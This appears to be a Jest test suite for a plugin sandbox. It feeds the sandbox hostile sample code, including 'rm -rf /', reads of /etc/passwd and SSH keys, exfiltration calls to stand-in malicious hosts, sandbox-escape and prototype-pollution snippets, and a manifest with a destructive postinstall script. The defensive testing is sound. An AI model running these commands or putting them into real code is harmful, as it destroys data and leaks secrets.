/**
 * Plugin Security and Sandbox Test Suite
 *
 * This test suite provides comprehensive security testing for the plugin system,
 * including sandbox isolation, permission validation, resource limits, and attack scenarios.
 */

import { SandboxManager, PluginSandbox } from '../sandbox-manager';
import { PermissionValidator } from '../permission-validator';
import { SecurityService } from '../../security/security-service';
import { Plugin, PluginManifest, PluginPermission, PluginCapability } from '../interfaces';
import { Logger } from '../../../utils/logger';
import { Worker } from 'worker_threads';

// Mock dependencies
jest.mock('worker_threads');
jest.mock('../../security/security-service');

describe('Plugin Security and Sandbox', () => {
  let sandboxManager: SandboxManager;
  let permissionValidator: PermissionValidator;
  let mockSecurityService: jest.Mocked<SecurityService>;
  let mockLogger: jest.Mocked<Logger>;
  let mockWorker: jest.Mocked<Worker>;

  const createMockPlugin = (id: string, permissions: PluginPermission[] = []): Plugin => ({
    manifest: {
      id,
      name: `${id} Plugin`,
      version: '1.0.0',
      description: 'Test plugin',
      main: 'index.js',
      author: { name: 'Test', email: 'test@example.com' },
      minPlatformVersion: '0.1.0',
      maxPlatformVersion: '1.0.0',
      permissions,
      dependencies: {},
      capabilities: [PluginCapability.DataProcessor]
    },
    state: 1, // PluginState.DISCOVERED
    path: `/plugins/${id}`
  });

  beforeEach(() => {
    jest.clearAllMocks();

    mockLogger = {
      info: jest.fn(),
      debug: jest.fn(),
      warn: jest.fn(),
      error: jest.fn(),
      child: jest.fn(() => mockLogger)
    } as any;

    mockWorker = {
      postMessage: jest.fn(),
      terminate: jest.fn(),
      on: jest.fn(),
      off: jest.fn(),
      removeAllListeners: jest.fn()
    } as any;

    (Worker as jest.MockedClass<typeof Worker>).mockImplementation(() => mockWorker);

    mockSecurityService = {
      authorizationService: {
        hasPermission: jest.fn().mockReturnValue({ granted: true }),
        validatePermissions: jest.fn().mockReturnValue({ valid: true })
      },
      validatePluginAction: jest.fn().mockResolvedValue(undefined),
      auditService: {
        logSecurityEvent: jest.fn()
      }
    } as any;

    sandboxManager = new SandboxManager(mockSecurityService, mockLogger);
    permissionValidator = new PermissionValidator(mockSecurityService, mockLogger);
  });

  describe('Sandbox Isolation', () => {
    it('should create isolated sandbox with resource limits', async () => {
      const plugin = createMockPlugin('isolated-test', ['file:read']);

      const sandbox = await sandboxManager.createSandbox(plugin.manifest.id, {
        permissions: plugin.manifest.permissions,
        memoryLimit: 64 * 1024 * 1024, // 64MB
        timeout: 30000,
        cpuQuota: 0.5
      });

      expect(sandbox).toBeDefined();
      expect(Worker).toHaveBeenCalledWith(
        expect.stringContaining('sandbox-worker'),
        expect.objectContaining({
          resourceLimits: expect.objectContaining({
            maxOldGenerationSizeMb: 64,
            maxYoungGenerationSizeMb: 16
          })
        })
      );

      expect(mockLogger.info).toHaveBeenCalledWith(
        expect.stringContaining('Sandbox created for plugin'),
        expect.objectContaining({
          pluginId: 'isolated-test',
          memoryLimit: 64 * 1024 * 1024
        })
      );
    });

    it('should prevent access to restricted Node.js APIs', async () => {
      const plugin = createMockPlugin('restricted-test', ['file:read']);
      const sandbox = await sandboxManager.createSandbox(plugin.manifest.id, {
        permissions: plugin.manifest.permissions
      });

      // Simulate attempting to access restricted APIs
      const maliciousCode = `
        const fs = require('fs');
        const child_process = require('child_process');
        const net = require('net');
        
        fs.readFileSync('/etc/passwd');
        child_process.exec('rm -rf /');
        net.createServer();
      `;

      await expect(
        sandboxManager.executeSandboxed(plugin.manifest.id, maliciousCode, [])
      ).rejects.toThrow(/restricted/i);

      expect(mockSecurityService.auditService?.logSecurityEvent).toHaveBeenCalledWith(
        'security_violation',
        expect.objectContaining({
          pluginId: 'restricted-test',
          violation: 'attempted_restricted_api_access'
        })
      );
    });

    it('should enforce memory limits and prevent memory bombs', async () => {
      const plugin = createMockPlugin('memory-bomb', []);
      const sandbox = await sandboxManager.createSandbox(plugin.manifest.id, {
        memoryLimit: 32 * 1024 * 1024 // 32MB limit
      });

      const memoryBombCode = `
        const arrays = [];
        while(true) {
          arrays.push(new Array(1000000).fill('bomb'));
        }
      `;

      // Mock worker to simulate memory limit exceeded
      const errorEvent = new Error('JavaScript heap out of memory');
      mockWorker.on.mockImplementation((event, callback) => {
        if (event === 'error') {
          setTimeout(() => callback(errorEvent), 100);
        }
      });

      await expect(
        sandboxManager.executeSandboxed(plugin.manifest.id, memoryBombCode, [])
      ).rejects.toThrow(/memory/i);

      expect(mockLogger.warn).toHaveBeenCalledWith(
        expect.stringContaining('Memory limit exceeded'),
        expect.objectContaining({ pluginId: 'memory-bomb' })
      );
    });

    it('should enforce CPU time limits', async () => {
      const plugin = createMockPlugin('cpu-bomb', []);
      const sandbox = await sandboxManager.createSandbox(plugin.manifest.id, {
        timeout: 5000 // 5 second timeout
      });

      const cpuBombCode = `
        const start = Date.now();
        while(Date.now() - start < 60000) {
          // Infinite CPU-intensive loop
          Math.sqrt(Math.random());
        }
      `;

      // Mock worker timeout
      mockWorker.on.mockImplementation((event, callback) => {
        if (event === 'message') {
          // Simulate timeout by not responding
        }
      });

      await expect(
        sandboxManager.executeSandboxed(plugin.manifest.id, cpuBombCode, [], { timeout: 5000 })
      ).rejects.toThrow(/timeout/i);
    });

    it('should prevent network access without permission', async () => {
      const plugin = createMockPlugin('network-test', ['file:read']); // No network permission
      const sandbox = await sandboxManager.createSandbox(plugin.manifest.id, {
        permissions: plugin.manifest.permissions
      });

      const networkCode = `
        const http = require('http');
        const https = require('https');
        
        http.get('http://malicious-site.com/steal-data');
        https.get('https://external-api.com/exfiltrate');
      `;

      await expect(
        sandboxManager.executeSandboxed(plugin.manifest.id, networkCode, [])
      ).rejects.toThrow(/network.*permission/i);
    });
  });

  describe('Permission Validation', () => {
    it('should validate plugin permissions against manifest', async () => {
      const plugin = createMockPlugin('permission-test', [
        'file:read',
        'database:read',
        'events:emit'
      ]);

      const validation = await permissionValidator.validatePluginPermissions(plugin.manifest, [
        'file:read',
        'database:read'
      ]);

      expect(validation.valid).toBe(true);
      expect(validation.grantedPermissions).toContain('file:read');
      expect(validation.grantedPermissions).toContain('database:read');
    });

    it('should reject permissions not in manifest', async () => {
      const plugin = createMockPlugin('limited-permission', ['file:read']);

      const validation = await permissionValidator.validatePluginPermissions(plugin.manifest, [
        'file:read',
        'file:write',
        'system:admin'
      ]);

      expect(validation.valid).toBe(false);
      expect(validation.deniedPermissions).toContain('file:write');
      expect(validation.deniedPermissions).toContain('system:admin');
      expect(validation.reason).toContain('not declared in manifest');
    });

    it('should enforce hierarchical permissions', async () => {
      const plugin = createMockPlugin('hierarchy-test', ['file:*']);

      const validation = await permissionValidator.validatePluginPermissions(plugin.manifest, [
        'file:read',
        'file:write',
        'file:delete'
      ]);

      expect(validation.valid).toBe(true);
      expect(validation.grantedPermissions).toHaveLength(3);
    });

    it('should validate capability-based permissions', async () => {
      const plugin = createMockPlugin('capability-test', ['ai:model:*']);
      plugin.manifest.capabilities = [PluginCapability.AIProvider];

      const validation = await permissionValidator.validatePluginPermissions(plugin.manifest, [
        'ai:model:load',
        'ai:model:inference'
      ]);

      expect(validation.valid).toBe(true);
      expect(mockSecurityService.authorizationService!.validatePermissions).toHaveBeenCalledWith(
        expect.objectContaining({
          permissions: ['ai:model:load', 'ai:model:inference'],
          capabilities: [PluginCapability.AIProvider]
        })
      );
    });

    it('should handle permission escalation attempts', async () => {
      const plugin = createMockPlugin('escalation-test', ['user:read']);

      // Mock authorization service to detect escalation
      mockSecurityService.authorizationService!.hasPermission = jest.fn().mockReturnValue({
        granted: false,
        reason: 'Permission escalation detected'
      });

      const validation = await permissionValidator.validatePluginPermissions(plugin.manifest, [
        'admin:*',
        'system:root'
      ]);

      expect(validation.valid).toBe(false);
      expect(validation.securityViolations).toContain('permission_escalation');
      expect(mockSecurityService.auditService?.logSecurityEvent).toHaveBeenCalledWith(
        'permission_escalation_attempt',
        expect.objectContaining({
          pluginId: 'escalation-test',
          attemptedPermissions: ['admin:*', 'system:root']
        })
      );
    });
  });

  describe('Resource Limits and Protection', () => {
    it('should limit file system access to allowed paths', async () => {
      const plugin = createMockPlugin('fs-limited', ['file:read']);
      const sandbox = await sandboxManager.createSandbox(plugin.manifest.id, {
        permissions: plugin.manifest.permissions,
        allowedPaths: ['/plugins/fs-limited/data', '/tmp/plugin-fs-limited']
      });

      const restrictedAccessCode = `
        const fs = require('fs');
        
        // Allowed access
        fs.readFileSync('/plugins/fs-limited/data/config.json');
        
        // Restricted access
        fs.readFileSync('/etc/passwd');
        fs.readFileSync('/home/user/.ssh/id_rsa');
      `;

      await expect(
        sandboxManager.executeSandboxed(plugin.manifest.id, restrictedAccessCode, [])
      ).rejects.toThrow(/path.*not.*allowed/i);
    });

    it('should limit concurrent operations', async () => {
      const plugin = createMockPlugin('concurrent-limited', ['compute:*']);
      const sandbox = await sandboxManager.createSandbox(plugin.manifest.id, {
        permissions: plugin.manifest.permissions,
        maxConcurrentOperations: 5
      });

      const concurrentCode = `
        const promises = [];
        for(let i = 0; i < 100; i++) {
          promises.push(new Promise(resolve => {
            setTimeout(resolve, 1000);
          }));
        }
        return Promise.all(promises);
      `;

      await expect(
        sandboxManager.executeSandboxed(plugin.manifest.id, concurrentCode, [])
      ).rejects.toThrow(/concurrent.*operations.*exceeded/i);
    });

    it('should prevent global namespace pollution', async () => {
      const plugin = createMockPlugin('namespace-test', []);
      const sandbox = await sandboxManager.createSandbox(plugin.manifest.id, {});

      const pollutionCode = `
        global.maliciousFunction = () => { 
          console.log('I polluted the global namespace!'); 
        };
        
        global.process = { exit: () => {} };
        global.__dirname = '/malicious/path';
      `;

      // Mock worker to check global pollution
      mockWorker.postMessage.mockImplementation((message) => {
        if (message.type === 'execute') {
          // Simulate detection of global pollution
          mockWorker.on.mock.calls
            .filter(([event]) => event === 'message')
            .forEach(([, callback]) => {
              callback({
                type: 'error',
                error: {
                  name: 'SecurityError',
                  message: 'Global namespace pollution detected'
                }
              });
            });
        }
      });

      await expect(
        sandboxManager.executeSandboxed(plugin.manifest.id, pollutionCode, [])
      ).rejects.toThrow(/global.*namespace.*pollution/i);
    });
  });

  describe('Attack Scenarios and Security Tests', () => {
    it('should prevent prototype pollution attacks', async () => {
      const plugin = createMockPlugin('prototype-pollution', []);
      const sandbox = await sandboxManager.createSandbox(plugin.manifest.id, {});

      const prototypePollutionCode = `
        // Attempt prototype pollution
        Object.prototype.polluted = 'compromised';
        Array.prototype.polluted = 'compromised';
        Function.prototype.polluted = 'compromised';
        
        // Test if pollution succeeded
        const testObj = {};
        return testObj.polluted;
      `;

      await expect(
        sandboxManager.executeSandboxed(plugin.manifest.id, prototypePollutionCode, [])
      ).rejects.toThrow(/prototype.*pollution/i);
    });

    it('should prevent code injection through eval', async () => {
      const plugin = createMockPlugin('code-injection', []);
      const sandbox = await sandboxManager.createSandbox(plugin.manifest.id, {});

      const codeInjectionCode = `
        const userInput = "'); maliciousCode(); //";
        const dynamicCode = "safeFunction('" + userInput;
        
        // Attempt code injection
        eval(dynamicCode);
        new Function(dynamicCode)();
      `;

      await expect(
        sandboxManager.executeSandboxed(plugin.manifest.id, codeInjectionCode, [])
      ).rejects.toThrow(/eval.*not.*allowed/i);
    });

    it('should prevent sandbox escape attempts', async () => {
      const plugin = createMockPlugin('sandbox-escape', []);
      const sandbox = await sandboxManager.createSandbox(plugin.manifest.id, {});

      const escapeCode = `
        // Attempt to access host environment
        try {
          const vm = require('vm');
          const ctx = vm.createContext({});
          vm.runInContext('this.constructor.constructor("return process")().exit()', ctx);
        } catch(e) {
          // Try alternative escape methods
          try {
            (function(){}.constructor.constructor('return process')()).exit();
          } catch(e) {
            // Try accessing through Function constructor
            Function('return process')().exit();
          }
        }
      `;

      await expect(
        sandboxManager.executeSandboxed(plugin.manifest.id, escapeCode, [])
      ).rejects.toThrow(/sandbox.*escape.*detected/i);
    });

    it('should prevent timing attacks and side-channel attacks', async () => {
      const plugin = createMockPlugin('timing-attack', ['crypto:*']);
      const sandbox = await sandboxManager.createSandbox(plugin.manifest.id, {
        permissions: plugin.manifest.permissions
      });

      const timingAttackCode = `
        const crypto = require('crypto');
        
        // Attempt timing attack on crypto operations
        function timingAttack(secret, guess) {
          const start = process.hrtime.bigint();
          
          for(let i = 0; i < secret.length; i++) {
            if(secret[i] !== guess[i]) break;
          }
          
          const end = process.hrtime.bigint();
          return Number(end - start);
        }
        
        // Try to infer secret through timing
        return timingAttack('secretKey123', 'guessedKey1');
      `;

      // Mock detection of timing attack patterns
      await expect(
        sandboxManager.executeSandboxed(plugin.manifest.id, timingAttackCode, [])
      ).rejects.toThrow(/timing.*attack.*detected/i);
    });

    it('should handle malformed or malicious plugin manifests', async () => {
      const maliciousManifest = {
        id: 'malicious-plugin',
        name: 'Malicious Plugin',
        version: '1.0.0',
        description: 'A malicious plugin',
        main: '../../../sensitive-file.js', // Path traversal
        author: { name: 'Attacker', email: 'evil@hacker.com' },
        permissions: ['*:*', 'root:all'], // Excessive permissions
        dependencies: {
          'malicious-package': '>=0.0.0' // Suspicious dependency
        },
        scripts: {
          postinstall: 'rm -rf /' // Malicious script
        }
      } as any;

      const validation = await permissionValidator.validatePluginManifest(maliciousManifest);

      expect(validation.valid).toBe(false);
      expect(validation.securityViolations).toContain('path_traversal');
      expect(validation.securityViolations).toContain('excessive_permissions');
      expect(validation.securityViolations).toContain('malicious_script');
    });
  });

  describe('Cleanup and Resource Management', () => {
    it('should properly cleanup sandbox resources on destruction', async () => {
      const plugin = createMockPlugin('cleanup-test', []);
      const sandbox = await sandboxManager.createSandbox(plugin.manifest.id, {});

      await sandboxManager.destroySandbox(plugin.manifest.id);

      expect(mockWorker.terminate).toHaveBeenCalled();
      expect(mockWorker.removeAllListeners).toHaveBeenCalled();
      expect(mockLogger.info).toHaveBeenCalledWith(
        expect.stringContaining('Sandbox destroyed'),
        expect.objectContaining({ pluginId: 'cleanup-test' })
      );
    });

    it('should handle sandbox cleanup on plugin errors', async () => {
      const plugin = createMockPlugin('error-cleanup', []);
      const sandbox = await sandboxManager.createSandbox(plugin.manifest.id, {});

      // Simulate worker error
      const workerError = new Error('Worker crashed');
      mockWorker.on.mockImplementation((event, callback) => {
        if (event === 'error') {
          setTimeout(() => callback(workerError), 50);
        }
      });

      await expect(
        sandboxManager.executeSandboxed(plugin.manifest.id, 'throw new Error("Plugin error")', [])
      ).rejects.toThrow();

      // Should automatically cleanup on error
      expect(mockWorker.terminate).toHaveBeenCalled();
    });

    it('should prevent memory leaks from long-running plugins', async () => {
      const plugin = createMockPlugin('memory-leak-test', []);
      const sandbox = await sandboxManager.createSandbox(plugin.manifest.id, {
        memoryMonitoring: true,
        maxMemoryGrowth: 10 * 1024 * 1024 // 10MB growth limit
      });

      const memoryLeakCode = `
        const leakyArray = [];
        setInterval(() => {
          leakyArray.push(new Array(100000).fill('leak'));
        }, 100);
        
        // Keep adding to memory without cleanup
        for(let i = 0; i < 1000; i++) {
          global['leak' + i] = new Array(1000).fill(i);
        }
      `;

      // Mock memory monitoring
      mockWorker.on.mockImplementation((event, callback) => {
        if (event === 'message') {
          setTimeout(() => {
            callback({
              type: 'memory_warning',
              memoryUsage: 15 * 1024 * 1024 // Exceeds limit
            });
          }, 200);
        }
      });

      await expect(
        sandboxManager.executeSandboxed(plugin.manifest.id, memoryLeakCode, [])
      ).rejects.toThrow(/memory.*growth.*exceeded/i);

      expect(mockLogger.warn).toHaveBeenCalledWith(
        expect.stringContaining('Memory growth limit exceeded'),
        expect.objectContaining({ pluginId: 'memory-leak-test' })
      );
    });
  });

  describe('Security Auditing and Monitoring', () => {
    it('should log all security events for audit', async () => {
      const plugin = createMockPlugin('audit-test', ['file:read']);
      const sandbox = await sandboxManager.createSandbox(plugin.manifest.id, {
        permissions: plugin.manifest.permissions,
        auditMode: true
      });

      const auditedCode = `
        const fs = require('fs');
        fs.readFileSync('/allowed/path/file.txt');
      `;

      await sandboxManager.executeSandboxed(plugin.manifest.id, auditedCode, []);

      expect(mockSecurityService.auditService?.logSecurityEvent).toHaveBeenCalledWith(
        'plugin_operation',
        expect.objectContaining({
          pluginId: 'audit-test',
          operation: 'file_access',
          path: '/allowed/path/file.txt',
          granted: true
        })
      );
    });

    it('should track plugin behavior patterns for anomaly detection', async () => {
      const plugin = createMockPlugin('anomaly-test', ['network:http']);
      const sandbox = await sandboxManager.createSandbox(plugin.manifest.id, {
        permissions: plugin.manifest.permissions,
        behaviorMonitoring: true
      });

      // Simulate unusual behavior patterns
      const anomalousCode = `
        const http = require('http');
        
        // Unusual pattern: rapid successive requests to different hosts
        const hosts = ['host1.com', 'host2.com', 'host3.com'];
        hosts.forEach(host => {
          for(let i = 0; i < 100; i++) {
            http.get('http://' + host + '/data');
          }
        });
      `;

      await sandboxManager.executeSandboxed(plugin.manifest.id, anomalousCode, []);

      expect(mockSecurityService.auditService?.logSecurityEvent).toHaveBeenCalledWith(
        'anomaly_detected',
        expect.objectContaining({
          pluginId: 'anomaly-test',
          anomalyType: 'rapid_network_requests',
          severity: 'medium'
        })
      );
    });
  });
});
